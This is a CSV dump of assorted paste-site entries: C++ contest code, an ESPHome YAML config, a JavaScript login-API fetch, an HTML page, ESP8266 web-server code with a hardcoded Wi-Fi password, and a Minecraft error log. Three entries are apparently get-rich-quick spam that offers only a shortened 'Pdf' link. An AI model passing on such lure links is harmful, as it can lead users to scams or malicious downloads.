id,title,username,language,date,content
F4qzBhc4,Untitled,Josif_tepe,C++,Monday 7th of April 2025 01:04:48 PM CDT,"#include <iostream>
#include <vector>
#include <queue>
#include <map>
#include <fstream>
#include <cstring>
using namespace std;
typedef long long ll;
const int maxn = 1e6 + 10;
 
int dist(int si, int sj, int ei, int ej) {
    return abs(si - ei) + abs(sj - ej);
}
pair<int, int> idx[maxn];
//vector<pair<int, int>> graph[maxn];
int pref_sum[maxn];
int cords[maxn];
int mat[10001][10001];
bool visited[maxn];
int main() {
//    ifstream cin(""in.txt"");
    ios_base::sync_with_stdio(false);
    cin.tie(0);
    
    memset(visited, false, sizeof visited);
    int r, c;
    cin >> r >> c;
    ll res = 0;
    int cnt = 1;
    for(int i = 0; i < r; i++) {
        for(int j = 0; j < c; j++) {
            cin >> mat[i][j];
            idx[cnt] = {i, j};
            cnt++;
        }
    }
    cnt = 1;
       for(int i = 0; i < r; i++) {
           for(int j = 0; j < c; j++) {
               if(cnt != mat[i][j]) {
                   
                   pair<int, int> c = make_pair(i, j);
                   if(!visited[cnt]) {
                       bool ok = false;
//                       cout << cnt << endl;
                       int sum = 0;
                       while(!ok) {
                           if(mat[c.first][c.second] == cnt) {
                               ok = true;
                           }
                           if(visited[mat[c.first][c.second]]) {
                               break;
                           }
                           visited[mat[c.first][c.second]] = true;
                           sum += dist(c.first, c.second, idx[mat[c.first][c.second]].first, idx[mat[c.first][c.second]].second);
                           pref_sum[mat[c.first][c.second]] = sum;
                           cords[mat[c.first][c.second]] = cnt;
                           c = idx[mat[c.first][c.second]];
                           if(ok) {
                               break;
                           }
                           
                       }
//                       cout << cnt << "" "" << sum << endl;
                       pref_sum[cnt] = sum;
                       visited[cnt] = true;
                       
                   }
               }
               cnt++;
           }
       }
   
    cnt = 1;
    for(int i = 0; i < r; i++) {
        for(int j = 0; j < c; j++) {
            int a = mat[i][j];
            int b = cnt;
            if(a != b) {
                 
                 if(cords[a] == b) {
                    res += pref_sum[b] - pref_sum[a];
                }
                else {
                    res += pref_sum[cords[a]] - pref_sum[a] + pref_sum[b];
//                    cout << cords[a] << "" "" << pref_sum[cords[a]] << "" "" << pref_sum[a] << "" "" << pref_sum[b] << endl;
//                    cout << b << "" "" << a << "" "" << pref_sum[cords[a]] - pref_sum[a] + pref_sum[b] << endl;
                }
//                break;
            }
            cnt++;
        }
    }
    cout << res << endl;
    return 0;
     
}
"
gh4w6AT1,钉板上的正方形 参考代码,Dmaxiya,C++,Monday 7th of April 2025 12:57:41 PM CDT,"#include <bits/stdc++.h>
using namespace std;

typedef long long LL;
const int maxn = 200000 + 100;
struct Vector {
    int x, y;
    Vector() : x(0), y(0) {}
    Vector(int x, int y) : x(x), y(y) {}
};

Vector operator+(const Vector &a, const Vector &b) {
    return Vector(a.x + b.x, a.y + b.y);
}

int operator*(const Vector &a, const Vector &b) {
    return a.x * b.x + a.y * b.y;
}

Vector rotate90(const Vector &v) {
    return Vector(Vector(0, -1) * v, Vector(1, 0) * v);
}

int n = 10;
set<int> st;
string G[10] = {
    ""1101011111"",
    ""1110011110"",
    ""1100101111"",
    ""1011011110"",
    ""1010111100"",
    ""1001010101"",
    ""1111111110"",
    ""0111111110"",
    ""0110101111"",
    ""1010010100""
};

bool judge(const Vector &p) {
    return p.x >= 0 && p.x < n && p.y >= 0 && p.y < n && G[p.x][p.y] == '1';
}

bool judge(int x1, int y1, int x2, int y2) {
    Vector v(x2 - x1, y2 - y1);
    v = rotate90(v);
    Vector p = Vector(x2, y2) + v;
    if (!judge(p)) {
        return false;
    }
    v = rotate90(v);
    p = p + v;
    return judge(p);
}

int main() {
#ifdef ExRoc
    freopen(""test.txt"", ""r"", stdin);
#endif // ExRoc
    ios::sync_with_stdio(false);

    for (int i = 0; i < n; ++i) {
        for (int j = 0; j < n; ++j) {
            if (G[i][j] != '1') {
                continue;
            }
            for (int k = 0; k < n; ++k) {
                for (int l = 0; l < n; ++l) {
                    if (G[k][l] != '1') {
                        continue;
                    }
                    if (judge(i, j, k, l)) {
                        Vector v(k - i, l - j);
                        st.insert(v * v);
                    }
                }
            }
        }
    }
    st.erase(0);
    cout << st.size() << endl;

    return 0;
}
"
AkarRkiX,EARN $900 INSTANTLY 2025 X0,KENA05,JavaScript,Monday 7th of April 2025 12:51:38 PM CDT," 
Pdf https://goo.su/DgLIPOe


1bBSEQHZ6J
"
PtuFiBEV,Untitled,arushear,YAML,Monday 7th of April 2025 12:51:03 PM CDT,"binary_sensor:
  - platform: gpio
    pin:
      number: GPIOXX
      mode: INPUT_PULLUP
      inverted: true
    name: ""Przycisk""
    on_press:
      - binary_sensor.template.publish:
          id: btn_short
          state: ON
      - delay: 50ms
      - binary_sensor.template.publish:
          id: btn_short
          state: OFF
    on_double_click:
      - binary_sensor.template.publish:
          id: btn_double
          state: ON
      - delay: 50ms
      - binary_sensor.template.publish:
          id: btn_double
          state: OFF
    on_long_press:
      - binary_sensor.template.publish:
          id: btn_long
          state: ON
      - delay: 50ms
      - binary_sensor.template.publish:
          id: btn_long
          state: OFF

binary_sensor:
  - platform: template
    id: btn_short
    name: ""Przycisk Short""
    device_class: moving
  - platform: template
    id: btn_double
    name: ""Przycisk Double""
    device_class: moving
  - platform: template
    id: btn_long
    name: ""Przycisk Long""
    device_class: moving
"
qE7Hk5Md,gemlog,crackit-id,JavaScript,Monday 7th of April 2025 12:43:05 PM CDT,"fetch('https://crackitindonesia.net/members/api/auth/ver2/login/', {
  ////this second argument containing method and body determines that this request is a POST request and what information will be sent to the API. 
  method: 'POST',  
  body: JSON.stringify({id: '200'})
}).then(response => {
  if (response.ok){
    return response.json();
  }
  throw new Error('Request failed!');
}, networkError => {
  console.log(networkError.message); 
}).then(jsonResponse => {
  return jsonResponse
}); "
fpHag9Ss,Make $1000 15-MINUTES (BEGINNER) 3R,KENA05,JavaScript,Monday 7th of April 2025 12:35:44 PM CDT," 
Pdf https://goo.su/DgLIPOe


2haaYNMJUC
"
WRA0Rrif,Untitled,RumenDulgerov,HTML,Monday 7th of April 2025 12:34:36 PM CDT,"<!DOCTYPE html>
<html lang=""bg"">
<head>
    <meta charset=""UTF-8"">
    <meta name=""viewport"" content=""width=device-width, initial-scale=1.0"">
    <title>ДЗИ</title>

        <style>
            body{
                width: 900px;
                background-color: #BFBFBF;
                text-align: center;
                font-family: ""Arial Narrow"", ""sans-serif"" ;
            }
            #blok1{
                padding: 10px;
                height: 300px;
                display: flex;
            }
            #blok2{
                width: 45%;
                justify-content: center;
            }
            #blok3{
                width: 45%;
                justify-content: center;
            }
            #blok4{
                padding: 10px;
                background-color: #f2f2f2;
            }
            #blok5{
                padding: 10px;
                height: 300px;
                display: flex;
            }
            #blok6{
                width: 45%;
                justify-content: center;
            }
            #blok7{
                width: 45%;
                justify-content: center;
            }
            .snimki{
                width: 45%;
                border-radius: 100%;
                border-color: #fff ;
                border: solid;
                border-width: 5px;
        
            }
        </style>
</head>
<body>
    <div id=""blok1"" class=""mainBlok"">
        <div id=""blok2"" class=""podBlok"">
            <img src=""img_1.jpg"" class=""snimki"">
            <h3>БЪЛГАРСКИ ЕЗИК И ЛИТЕРАТУРА</h3>
        </div>
        <div id=""blok3"" class=""podBlok"">
            <img src=""Img_2.jpg"" class=""snimki"">
            <h3>БИОЛОГИЯ</h3>
        </div>
    </div>
    <div id=""blok4"" class=""mainBlok"">
        <h1>ПОДГОТВИ СЕ ЗА МАТУРИТЕ УСПЕШНО!</h1>
    </div>
    <div id=""blok5"" class=""mainBlok"">
        <div id=""blok6"" class=""podBlok"" >
            <img src=""Img_3.jpg""class=""snimki"">
            <h3>ИНФОРМАТИКА</h3>
        </div>
        <div id=""blok7"" class=""podBlok"">
            <img src=""img_4.jpg""class=""snimki"">
            <h3>ИНФОРМАЦИОННИ ТЕХНОЛОГИИ</h3>
        </div>
    </div>
</body>
</html>"
BZp3jBga,EARN $900 INSTANTLY 2025 Z1,KENA05,JavaScript,Monday 7th of April 2025 12:19:48 PM CDT," 
Pdf https://goo.su/DgLIPOe


I0H2AWUn4l
"
FbZPGx4g,Untitled,Mattykurlzz,C++,Monday 7th of April 2025 12:13:58 PM CDT," // ======================================================
// Webserver program that sends button information
// to ESP8266 and puts a control led on the page
// ======================================================

#include <ESP8266WiFi.h>
#include <ESP8266WebServer.h>

ESP8266WebServer server(80);

// Your routers credentials
const char* ssid = ""Mi PhoneR"";
const char* password = ""12345678"";

// ==========================================
// initial variables
// ========================================== 

String buttonON;
String buttonOFF;

int sumDelay = 0;

#define pinForward D6
#define pinBackward D7

#define maxDelay  10000
#define step      1000

void calibrate();


// =========================================
// Here is the HTML page
// =========================================
String getPage()
  {
  String page = ""<!DOCTYPE HTML>"";
  page += ""<html>"";
  page += ""<head>"";
  page += ""<meta name = \""viewport\"" content = \""width = device-width, initial-scale = 1.0 maximum-scale = 2.5, user-scalable=1\"">"";
  page += ""<title>Luc's button demo</title>"";
  page += ""<body style='background-color:powderblue;'>""; 
  page += ""</head>"";
  page += ""<body>"";
  
  page += ""<h1 style='color:red'>Luc's web-button for ESP8266</h1>"";
  page += ""<br>"";
  page += ""<br>"";

  page += ""<FORM action=\""/\"" method=\""post\"">"";
  page += ""<button type=\""submit\"" name=\""button1ON\"" id=\""button1ON\"" value=\""but1ON\"">Open</button>"";
  page += ""</form>"";

  page += ""<FORM action=\""/\"" method=\""post\"">"";
  page += ""<button type=\""submit\"" name=\""button1OFF\"" id=\""button1OFF\"" value=\""but1OFF\"">Close</button>"";
  page += ""</form>"";

  page += ""<FORM action=\""/\"" method=\""post\"">"";
  page += ""<button type=\""submit\"" name=\""button3\"" id=\""button3\"" value=\""but3\"">Open full</button>"";
  page += ""</form>"";

  page += ""<FORM action=\""/\"" method=\""post\"">"";
  page += ""<button type=\""submit\"" name=\""button4\"" id=\""button4\"" value=\""but4\"">Close full</button>"";
  page += ""</form>"";

  page += ""<br>"";
  page += ""<br>"";

  return page;
  }


// ==================================================
// Handle for page not found
// ==================================================
void handleNotFound()
{
  server.send(200, ""text/html"", getPage());
}


// ==================================================
// Handle submit form
// ==================================================
void handleSubmit()
{
  //Text to show
   
   if (server.hasArg(""button1ON""))
      {
      buttonON = server.arg(""button1ON"");
      digitalWrite(pinForward, HIGH);
      int wait = sumDelay <= (maxDelay - step) ? step : (maxDelay - sumDelay);
      delay(wait);
      sumDelay += wait;
      digitalWrite(pinForward, LOW);
      } 

   if (server.hasArg(""button1OFF""))
      {
      buttonOFF = server.arg(""button1OFF"");
      digitalWrite(pinBackward, HIGH);
      int wait = sumDelay > step ? step : sumDelay;
      delay(wait);
      sumDelay -= wait;
      digitalWrite(pinBackward, LOW);
      }  

  if (server.hasArg(""button4""))
      {
      buttonOFF = server.arg(""button4"");
      calibrate();
      sumDelay = 0;
      }  

  if (server.hasArg(""button3""))
      {
      buttonOFF = server.arg(""button3"");
      digitalWrite(pinBackward, HIGH);
      int wait = maxDelay - sumDelay;
      delay(wait);
      sumDelay -= wait;
      digitalWrite(pinBackward, LOW);
      }      
     
  server.send(200, ""text/html"", getPage());       //Response to the HTTP request

}  


// ===================================================
// Handle root
// ===================================================
void handleRoot() 
{   
  if (server.args() ) 
    {
    handleSubmit();
    } 
  else 
    {
    server.send(200, ""text/html"", getPage());  
    }
}

void calibrate() {
  while(digitalRead(D3)) {
    digitalWrite(pinForward, HIGH);
    delay(10);
  }
    digitalWrite(pinForward, LOW);
}


// ===================================================
// Setup
// ===================================================
void setup()
{
  pinMode(D6, OUTPUT);
  pinMode(D7, OUTPUT);
  digitalWrite(D6, LOW);
  digitalWrite(D7, LOW);

  delay(1000);
  Serial.begin(9600);

  pinMode(D3, INPUT_PULLUP);

  // Connect to Wi-Fi network with SSID and password
  Serial.print(""Connecting to "");
  Serial.println(ssid);
  Serial.print(WiFi.begin(ssid,password));
  while (WiFi.status() != WL_CONNECTED) 
  {
    delay(500);
    Serial.print(""."");
    Serial.print(WiFi.status());
  }
  // Print local IP address and start web server
  Serial.println("""");
  Serial.println(""WiFi connected."");
  Serial.println(""IP address: "");
  Serial.println(WiFi.localIP());
  server.begin();
  server.on(""/"", handleRoot);
  server.onNotFound(handleNotFound);

  server.begin();
  delay(500);
  calibrate();
}


// ===================================================
// Loop
// ===================================================
void loop()
{  
  server.handleClient(); 
  delay(50);
}
"
cAaY0hNa,Untitled,levshx,Bash,Monday 7th of April 2025 11:34:19 AM CDT,"[19:29:34] [NEI-worker-thread-7/ERROR] [NotEnoughItems/]: Error while looking up usage recipe
[19:29:34] [NEI-worker-thread-7/ERROR] [NotEnoughItems/]: inputId: item
[19:29:34] [NEI-worker-thread-7/ERROR] [NotEnoughItems/]: ingredients: [16xitem.crabClaw@0]
[19:29:34] [NEI-worker-thread-7/INFO] [STDERR/]: [java.lang.Throwable$WrappedPrintStream:println:-1]: java.lang.ClassCastException: null not an ItemStack, ItemStack[] or List<ItemStack?
[19:29:34] [NEI-worker-thread-7/INFO] [STDERR/]: [java.lang.Throwable$WrappedPrintStream:println:-1]: 	at Launch//codechicken.nei.NEIServerUtils.extractRecipeItems(NEIServerUtils.java:376)
[19:29:34] [NEI-worker-thread-7/INFO] [STDERR/]: [java.lang.Throwable$WrappedPrintStream:println:-1]: 	at Launch//codechicken.nei.PositionedStack.<init>(PositionedStack.java:32)
[19:29:34] [NEI-worker-thread-7/INFO] [STDERR/]: [java.lang.Throwable$WrappedPrintStream:println:-1]: 	at Launch//codechicken.nei.PositionedStack.<init>(PositionedStack.java:44)
[19:29:34] [NEI-worker-thread-7/INFO] [STDERR/]: [java.lang.Throwable$WrappedPrintStream:println:-1]: 	at Launch//codechicken.nei.recipe.ShapedRecipeHandler$CachedShapedRecipe.<init>(ShapedRecipeHandler.java:34)
[19:29:34] [NEI-worker-thread-7/INFO] [STDERR/]: [java.lang.Throwable$WrappedPrintStream:println:-1]: 	at Launch//codechicken.nei.recipe.ShapedRecipeHandler$CachedShapedRecipe.<init>(ShapedRecipeHandler.java:40)
[19:29:34] [NEI-worker-thread-7/INFO] [STDERR/]: [java.lang.Throwable$WrappedPrintStream:println:-1]: 	at Launch//codechicken.nei.recipe.ShapedRecipeHandler.loadUsageRecipes(ShapedRecipeHandler.java:122)
[19:29:34] [NEI-worker-thread-7/INFO] [STDERR/]: [java.lang.Throwable$WrappedPrintStream:println:-1]: 	at Launch//codechicken.nei.recipe.TemplateRecipeHandler.loadUsageRecipes(TemplateRecipeHandler.java:440)
[19:29:34] [NEI-worker-thread-7/INFO] [STDERR/]: [java.lang.Throwable$WrappedPrintStream:println:-1]: 	at Launch//codechicken.nei.recipe.TemplateRecipeHandler.getUsageHandler(TemplateRecipeHandler.java:567)
[19:29:34] [NEI-worker-thread-7/INFO] [STDERR/]: [java.lang.Throwable$WrappedPrintStream:println:-1]: 	at Launch//codechicken.nei.recipe.TemplateRecipeHandler.getUsageAndCatalystHandler(TemplateRecipeHandler.java:591)
[19:29:34] [NEI-worker-thread-7/INFO] [STDERR/]: [java.lang.Throwable$WrappedPrintStream:println:-1]: 	at Launch//codechicken.nei.recipe.GuiUsageRecipe.getUsageOrCatalystHandler(GuiUsageRecipe.java:96)
[19:29:34] [NEI-worker-thread-7/INFO] [STDERR/]: [java.lang.Throwable$WrappedPrintStream:println:-1]: 	at Launch//codechicken.nei.recipe.GuiUsageRecipe.lambda$getUsageHandlers$0(GuiUsageRecipe.java:52)
[19:29:34] [NEI-worker-thread-7/INFO] [STDERR/]: [java.lang.Throwable$WrappedPrintStream:println:-1]: 	at Launch//codechicken.nei.recipe.RecipeHandlerQuery.lambda$getHandlersWithRecipes$3(RecipeHandlerQuery.java:98)
[19:29:34] [NEI-worker-thread-7/INFO] [STDERR/]: [java.lang.Throwable$WrappedPrintStream:println:-1]: 	at java.base/java.util.stream.ReferencePipeline$3$1.accept(Unknown Source)
[19:29:34] [NEI-worker-thread-7/INFO] [STDERR/]: [java.lang.Throwable$WrappedPrintStream:println:-1]: 	at java.base/java.util.ArrayList$ArrayListSpliterator.forEachRemaining(Unknown Source)
[19:29:34] [NEI-worker-thread-7/INFO] [STDERR/]: [java.lang.Throwable$WrappedPrintStream:println:-1]: 	at java.base/java.util.stream.AbstractPipeline.copyInto(Unknown Source)
[19:29:34] [NEI-worker-thread-7/INFO] [STDERR/]: [java.lang.Throwable$WrappedPrintStream:println:-1]: 	at java.base/java.util.stream.AbstractPipeline.wrapAndCopyInto(Unknown Source)
[19:29:34] [NEI-worker-thread-7/INFO] [STDERR/]: [java.lang.Throwable$WrappedPrintStream:println:-1]: 	at java.base/java.util.stream.ReduceOps$ReduceTask.doLeaf(Unknown Source)
[19:29:34] [NEI-worker-thread-7/INFO] [STDERR/]: [java.lang.Throwable$WrappedPrintStream:println:-1]: 	at java.base/java.util.stream.ReduceOps$ReduceTask.doLeaf(Unknown Source)
[19:29:34] [NEI-worker-thread-7/INFO] [STDERR/]: [java.lang.Throwable$WrappedPrintStream:println:-1]: 	at java.base/java.util.stream.AbstractTask.compute(Unknown Source)
[19:29:34] [NEI-worker-thread-7/INFO] [STDERR/]: [java.lang.Throwable$WrappedPrintStream:println:-1]: 	at java.base/java.util.concurrent.CountedCompleter.exec(Unknown Source)
[19:29:34] [NEI-worker-thread-7/INFO] [STDERR/]: [java.lang.Throwable$WrappedPrintStream:println:-1]: 	at java.base/java.util.concurrent.ForkJoinTask.doExec(Unknown Source)
[19:29:34] [NEI-worker-thread-7/INFO] [STDERR/]: [java.lang.Throwable$WrappedPrintStream:println:-1]: 	at java.base/java.util.concurrent.ForkJoinPool$WorkQueue.topLevelExec(Unknown Source)
[19:29:34] [NEI-worker-thread-7/INFO] [STDERR/]: [java.lang.Throwable$WrappedPrintStream:println:-1]: 	at java.base/java.util.concurrent.ForkJoinPool.scan(Unknown Source)
[19:29:34] [NEI-worker-thread-7/INFO] [STDERR/]: [java.lang.Throwable$WrappedPrintStream:println:-1]: 	at java.base/java.util.concurrent.ForkJoinPool.runWorker(Unknown Source)
[19:29:34] [NEI-worker-thread-7/INFO] [STDERR/]: [java.lang.Throwable$WrappedPrintStream:println:-1]: 	at java.base/java.util.concurrent.ForkJoinWorkerThread.run(Unknown Source)"
